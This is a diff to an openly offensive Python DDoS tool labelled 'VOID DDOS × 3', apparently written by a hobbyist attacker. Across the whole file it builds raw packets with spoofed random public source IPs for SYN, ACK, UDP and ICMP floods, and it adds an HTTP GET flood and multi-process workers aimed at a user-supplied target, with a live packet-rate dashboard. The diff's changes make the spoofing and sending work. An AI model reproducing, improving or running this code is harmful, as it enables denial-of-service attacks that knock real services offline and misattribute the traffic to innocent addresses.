@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # ══════════════════════════════════════════════════════════════════
-# ##  VOID DDOS × 3 — WORKING VERSION
-# ##  3 processes · actually sends packets · @lfw.k4rma_
+# ##  VOID DDOS × 3 — FIXED VERSION
+# ##  Actually works now · @lfw.k4rma_
 # ══════════════════════════════════════════════════════════════════
 
 import subprocess, sys, os
@@ -37,13 +37,13 @@ console    = Console()
 # CONFIG
 # ══════════════════════════════════════════════════════════════════
 N_INSTANCES  = 3
-N_THREADS    = 32    # per instance (reduced from 128 to prevent lag)
+N_THREADS    = 32
 POOL_SIZE    = 1000
 BATCH_REPORT = 100
 BUF_SIZE     = 4 * 1024 * 1024
 
 # ══════════════════════════════════════════════════════════════════
-# PACKET ENGINE
+# PACKET ENGINE (FIXED)
 # ══════════════════════════════════════════════════════════════════
 
 def _checksum(data):
@@ -56,59 +56,92 @@ def _checksum(data):
 
 F_SYN=0x002; F_ACK=0x010; F_RST=0x004; F_FIN=0x001; F_PSH=0x008
 
+def _rand_ip():
+    """Generate valid random IP for spoofing"""
+    # Use valid public IP ranges
+    while True:
+        a = random.choice([1,2,3,4,5,8,9,14,17,18,23,24,25,26,28,32,33,34,35,38,40,41,44,45,46,47,48,50,52,54,55,56])
+        b = random.randint(0, 255)
+        c = random.randint(0, 255)
+        d = random.randint(1, 254)
+        ip = f"{a}.{b}.{c}.{d}"
+        # Validate it works with inet_aton
+        try:
+            socket.inet_aton(ip)
+            return ip
+        except:
+            continue
+
+def _rand_port():
+    return random.randint(1024, 65535)
+
 def _ip_header(src,dst,proto,plen):
-    sid=random.randint(0,65535); ttl=random.randint(48,128)
-    s=socket.inet_aton(src); d=socket.inet_aton(dst)
+    sid=random.randint(0,65535)
+    ttl=random.randint(48,128)
+    try:
+        s=socket.inet_aton(src)
+        d=socket.inet_aton(dst)
+    except:
+        # Fallback to localhost if invalid (shouldn't happen)
+        s=socket.inet_aton("127.0.0.1")
+        d=socket.inet_aton(dst)
     h=struct.pack('!BBHHHBBH4s4s',(4<<4)|5,0,20+plen,sid,0,ttl,proto,0,s,d)
     return struct.pack('!BBHHHBBH4s4s',(4<<4)|5,0,20+plen,sid,0,ttl,proto,_checksum(h),s,d)
 
 def _tcp_seg(si,di,sp,dp,flags):
-    seq=random.randint(0,2**32-1); win=random.randint(1024,65535)
+    seq=random.randint(0,2**32-1)
+    win=random.randint(1024,65535)
     off=(5<<4)|0
     seg=struct.pack('!HHIIBBHHH',sp,dp,seq,0,off,flags,win,0,0)
-    ps=struct.pack('!4s4sBBH',socket.inet_aton(si),socket.inet_aton(di),0,6,len(seg))
+    try:
+        ps=struct.pack('!4s4sBBH',socket.inet_aton(si),socket.inet_aton(di),0,6,len(seg))
+    except:
+        # Invalid IP, use dummy
+        ps=struct.pack('!4s4sBBH',socket.inet_aton("1.2.3.4"),socket.inet_aton(di),0,6,len(seg))
     chk=_checksum(ps+seg)
     return struct.pack('!HHIIBBHHH',sp,dp,seq,0,off,flags,win,chk,0)
 
 def _udp_seg(si,di,sp,dp):
-    data=random.randbytes(64); ln=8+len(data)
+    data=random.randbytes(64)
+    ln=8+len(data)
     seg=struct.pack('!HHHH',sp,dp,ln,0)+data
-    ps=struct.pack('!4s4sBBH',socket.inet_aton(si),socket.inet_aton(di),0,17,ln)
+    try:
+        ps=struct.pack('!4s4sBBH',socket.inet_aton(si),socket.inet_aton(di),0,17,ln)
+    except:
+        ps=struct.pack('!4s4sBBH',socket.inet_aton("1.2.3.4"),socket.inet_aton(di),0,17,ln)
     chk=_checksum(ps+seg[:8]+data)
     return struct.pack('!HHHH',sp,dp,ln,chk)+data
 
 def _icmp():
-    id_=random.randint(0,65535); seq=random.randint(0,65535); pay=random.randbytes(56)
+    id_=random.randint(0,65535)
+    seq=random.randint(0,65535)
+    pay=random.randbytes(56)
     h=struct.pack('!BBHHH',8,0,0,id_,seq)
     return struct.pack('!BBHHH',8,0,_checksum(h+pay),id_,seq)+pay
 
 def _build_pkt(mk,si,di,sp,dp):
     if mk=="SYN":
-        t=_tcp_seg(si,di,sp,dp,F_SYN); return _ip_header(si,di,6,len(t))+t
+        t=_tcp_seg(si,di,sp,dp,F_SYN)
+        return _ip_header(si,di,6,len(t))+t
     elif mk=="ACK":
-        t=_tcp_seg(si,di,sp,dp,F_ACK); return _ip_header(si,di,6,len(t))+t
+        t=_tcp_seg(si,di,sp,dp,F_ACK)
+        return _ip_header(si,di,6,len(t))+t
     elif mk=="UDP":
-        u=_udp_seg(si,di,sp,dp); return _ip_header(si,di,17,len(u))+u
+        u=_udp_seg(si,di,sp,dp)
+        return _ip_header(si,di,17,len(u))+u
     elif mk=="ICMP":
-        ic=_icmp(); return _ip_header(si,di,1,len(ic))+ic
+        ic=_icmp()
+        return _ip_header(si,di,1,len(ic))+ic
     return b''
-
-def _rand_ip():
-    a=random.randint(1,223)
-    while a in (10,127,169,172,192): a=random.randint(1,223)
-    return f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-
-def _rand_port(): return random.randint(1024,65535)
 
 def _build_pool(mk,tip,tport,size):
     return [_build_pkt(mk,_rand_ip(),tip,_rand_port(),tport) for _ in range(size)]
 
 # ══════════════════════════════════════════════════════════════════
-# WORKERS (FIXED)
+# WORKERS
 # ══════════════════════════════════════════════════════════════════
 
 def _http_worker(tip, tport, sent_v, replies_v, errors_v, stop_v):
-    """HTTP flood worker"""
     agents=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"]
     paths=["/","/index.html","/api","/login"]
     
@@ -120,11 +153,7 @@ def _http_worker(tip, tport, sent_v, replies_v, errors_v, stop_v):
             req=(f"GET {random.choice(paths)} HTTP/1.1\r\nHost: {tip}\r\n"
                  f"User-Agent: {random.choice(agents)}\r\nConnection: close\r\n\r\n").encode()
             s.sendall(req)
-            
-            # Update sent counter
             with sent_v.get_lock(): sent_v.value += 1
-            
-            # Try to get reply
             try:
                 if s.recv(512): 
                     with replies_v.get_lock(): replies_v.value += 1
@@ -135,14 +164,12 @@ def _http_worker(tip, tport, sent_v, replies_v, errors_v, stop_v):
             time.sleep(0.001)
 
 def _raw_sender(tip, tport, mk, sent_v, errors_v, stop_v):
-    """Raw socket sender - ACTUALLY SENDS PACKETS"""
     try:
         sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
         sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
         sock.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,BUF_SIZE)
         sock.setblocking(False)
         
-        # Build packet pool
         pool=_build_pool(mk,tip,tport,POOL_SIZE)
         idx=0
         batch=0
@@ -150,29 +177,23 @@ def _raw_sender(tip, tport, mk, sent_v, errors_v, stop_v):
         
         while not stop_v.value:
             try:
-                # SEND THE PACKET
                 sock.sendto(pool[idx],(tip,0))
-                
                 idx=(idx+1)%POOL_SIZE
                 batch+=1
                 total+=1
                 
-                # Report in batches
                 if batch>=BATCH_REPORT:
                     with sent_v.get_lock(): sent_v.value+=batch
                     batch=0
                 
-                # Refresh pool periodically
                 if total%(POOL_SIZE*10)==0:
                     pool=_build_pool(mk,tip,tport,POOL_SIZE)
                     idx=0
                 
-                # Yield CPU occasionally
                 if total%500==0:
                     time.sleep(0.0001)
                     
             except BlockingIOError:
-                # Buffer full, just continue
                 if batch:
                     with sent_v.get_lock(): sent_v.value+=batch
                     batch=0
@@ -180,20 +201,17 @@ def _raw_sender(tip, tport, mk, sent_v, errors_v, stop_v):
             except Exception as e:
                 with errors_v.get_lock(): errors_v.value+=1
                 
-        # Flush remaining
         if batch:
             with sent_v.get_lock(): sent_v.value+=batch
-            
         sock.close()
     except PermissionError:
-        print(f"[!] Need root for raw sockets")
+        print(f"[Instance] Need root for raw sockets")
         stop_v.value=1
     except Exception as e:
-        print(f"[!] Sender error: {e}")
+        print(f"[Instance] Sender error: {e}")
         with errors_v.get_lock(): errors_v.value+=1
 
 def _raw_listener(tip, tport, mk, replies_v, stop_v):
-    """Listen for replies"""
     try:
         proto=socket.IPPROTO_TCP if mk in ("SYN","ACK") else socket.IPPROTO_ICMP
         sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,proto)
@@ -211,7 +229,7 @@ def _raw_listener(tip, tport, mk, replies_v, stop_v):
                     ihl=(pkt[0]&0x0f)*4
                     if len(pkt)<ihl+20: continue
                     tcph=struct.unpack('!HHIIBBHHH',pkt[ihl:ihl+20])
-                    if tcph[0]==tport:  # Reply from target port
+                    if tcph[0]==tport:
                         with replies_v.get_lock(): replies_v.value+=1
                 else:
                     ihl=(pkt[0]&0x0f)*4
@@ -225,10 +243,7 @@ def _raw_listener(tip, tport, mk, replies_v, stop_v):
     except Exception: pass
 
 def worker_main(instance_id, tip, tport, mk, sent_v, replies_v, errors_v, stop_v):
-    """Worker process entry point"""
     threads=[]
-    
-    print(f"[Instance {instance_id+1}] Starting {N_THREADS} threads...")
     
     if mk=="HTTP":
         for _ in range(N_THREADS):
@@ -243,17 +258,14 @@ def worker_main(instance_id, tip, tport, mk, sent_v, replies_v, errors_v, stop_v
             t.start()
             threads.append(t)
         
-        # Listener thread
         lt=threading.Thread(target=_raw_listener,
             args=(tip,tport,mk,replies_v,stop_v),daemon=True)
         lt.start()
         threads.append(lt)
     
-    # Keep alive until stop
     while not stop_v.value:
         time.sleep(0.5)
     
-    print(f"[Instance {instance_id+1}] Stopping...")
     for t in threads: t.join(timeout=2.0)
 
 # ══════════════════════════════════════════════════════════════════
@@ -305,7 +317,6 @@ def main():
     banner()
     console.print()
 
-    # Input
     console.print("  [bright_red]◈[/]  ",end="")
     raw_t=input("Target IP or hostname: ").strip()
     if not raw_t: console.print("  [red]No target.[/]"); return
@@ -336,13 +347,11 @@ def main():
 
     mk=mode["key"]; col=mode["color"]; label=mode["label"]
 
-    # Shared counters
     sent_v    = [mp.Value(ctypes.c_uint64,0) for _ in range(N_INSTANCES)]
     replies_v = [mp.Value(ctypes.c_uint64,0) for _ in range(N_INSTANCES)]
     errors_v  = [mp.Value(ctypes.c_uint64,0) for _ in range(N_INSTANCES)]
     stop_val  = mp.Value(ctypes.c_int, 0)
 
-    # Countdown
     console.print()
     for i in range(3,0,-1):
         console.print(f"\r  [bold bright_red][!][/]  [white]Launching in [bright_red]{i}[/]...[/]",end="")
@@ -350,7 +359,6 @@ def main():
     console.print(f"\r  [bold bright_red][!!!][/]  [bright_red]FIRING — {N_INSTANCES*N_THREADS} THREADS TOTAL              [/]")
     console.print()
 
-    # Spawn processes
     procs=[]
     for i in range(N_INSTANCES):
         p=mp.Process(
@@ -364,7 +372,6 @@ def main():
     last_sent=[0]*N_INSTANCES
     last_t=time.time()
 
-    # Live dashboard
     try:
         from rich.console import Group
         with Live(console=console,refresh_per_second=2,screen=False) as live:
@@ -372,7 +379,6 @@ def main():
                 now=time.time(); dt=max(now-last_t,0.001); last_t=now
                 snaps=[{"sent":sent_v[i].value,"replies":replies_v[i].value,"errors":errors_v[i].value} for i in range(N_INSTANCES)]
 
-                # Calculate PPS per instance
                 pps_each=[]
                 for i,s in enumerate(snaps):
                     pps_each.append((s["sent"]-last_sent[i])/dt)
@@ -383,7 +389,6 @@ def main():
                 total_pps=sum(pps_each)
                 elap=now-start
 
-                # Build display
                 inst_tbl=Table.grid(padding=(0,2))
                 inst_tbl.add_column();inst_tbl.add_column();inst_tbl.add_column();inst_tbl.add_column();inst_tbl.add_column()
                 inst_tbl.add_row(
@@ -429,11 +434,9 @@ def main():
     except KeyboardInterrupt:
         pass
 
-    # Stop
     stop_val.value=1
     for p in procs: p.join(timeout=3.0)
 
-    # Summary
     total_sent=sum(sent_v[i].value for i in range(N_INSTANCES))
     total_replies=sum(replies_v[i].value for i in range(N_INSTANCES))
     elap=time.time()-start
@@ -445,7 +448,8 @@ def main():
     console.print(f"  [dim]Total sent     [/] [bold white]{total_sent:,}[/]")
     console.print(f"  [dim]Total replies  [/] [bold white]{total_replies:,}[/]")
     console.print(f"  [dim]Duration       [/] [bold white]{elap:.1f}s[/]")
-    console.print(f"  [dim]Avg PPS        [/] [bold white]{total_sent/elap:,.0f}[/]" if elap>0 else "  [dim]Avg PPS        [/] [bold white]0[/]")
+    if elap>0:
+        console.print(f"  [dim]Avg PPS        [/] [bold white]{total_sent/elap:,.0f}[/]")
     console.print()
     console.print(Rule(style="bright_red"))
 
